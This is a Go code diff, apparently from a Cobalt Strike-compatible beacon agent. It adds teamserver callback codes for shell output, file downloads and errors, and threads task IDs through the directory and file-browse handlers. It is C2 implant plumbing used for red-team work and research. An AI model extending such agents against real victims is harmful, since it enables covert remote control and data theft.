@@ -27,6 +27,21 @@ const (
 	CMD_TYPE_FILE_BROWSE  = 53
 )
 
+// Callback type constants (agent → teamserver)
+const (
+	CALLBACK_OUTPUT            = 0
+	CALLBACK_FILE              = 2  // download start
+	CALLBACK_FILE_WRITE        = 8  // download chunk
+	CALLBACK_FILE_CLOSE        = 9  // download complete
+	CALLBACK_PWD               = 19
+	CALLBACK_FILE_BROWSE       = 22
+	CALLBACK_DEAD              = 26 // exit confirmation
+	CALLBACK_ERROR             = 31
+	CALLBACK_OUTPUT_JOBS       = 56 // shell output, CS 4.12
+	CALLBACK_PROCESS_STARTED   = 58 // shell started
+	CALLBACK_PROCESS_COMPLETED = 59 // shell/job completed
+)
+
 func ParseCommandShell(b []byte) (string, []byte) {
 	buf := bytes.NewBuffer(b)
 	pathLenBytes := make([]byte, 4)
@@ -111,23 +126,23 @@ func Upload(filePath string, fileContent []byte) int {
 	}
 	return offset
 }
-func ChangeCurrentDir(path []byte) {
+func ChangeCurrentDir(path []byte, taskID [8]byte) {
 	err := os.Chdir(string(path))
 	if err != nil {
-		processErrorTest(err.Error())
+		ProcessErrorWithTaskID(err.Error(), taskID)
 	}
 }
-func GetCurrentDirectory() []byte {
+func GetCurrentDirectory(taskID [8]byte) []byte {
 	pwd, err := os.Getwd()
 	result, err := filepath.Abs(pwd)
 	if err != nil {
-		processErrorTest(err.Error())
+		ProcessErrorWithTaskID(err.Error(), taskID)
 		return nil
 	}
 	return []byte(result)
 }
 
-func File_Browse(b []byte) []byte {
+func File_Browse(b []byte, taskID [8]byte) []byte {
 	buf := bytes.NewBuffer(b)
 	pendingRequest := make([]byte, 4)
 	dirPathLenBytes := make([]byte, 4)
@@ -171,7 +186,7 @@ func File_Browse(b []byte) []byte {
 	*/
 	fileInfo, err := os.Stat(dirPathStr)
 	if err != nil {
-		processErrorTest(err.Error())
+		ProcessErrorWithTaskID(err.Error(), taskID)
 		return nil
 	}
 	modTime := fileInfo.ModTime()
@@ -203,12 +218,12 @@ func File_Browse(b []byte) []byte {
 	return utilities.BytesCombine(pendingRequest, []byte(resultStr))
 }
 
-func processErrorTest(err string) {
+func ProcessErrorWithTaskID(errStr string, taskID [8]byte) {
 	errIdBytes := transports.WriteInt(0) // must be zero
 	arg1Bytes := transports.WriteInt(0)  // for debug
 	arg2Bytes := transports.WriteInt(0)
-	errMsgBytes := []byte(err)
+	errMsgBytes := []byte(errStr)
 	result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPacket := transports.MakePacket(31, result)
-	transports.PushResult(finalPacket)
+	finalPacket := transports.MakePacket(CALLBACK_ERROR, taskID, result)
+	transports.QueueResult(finalPacket)
 }
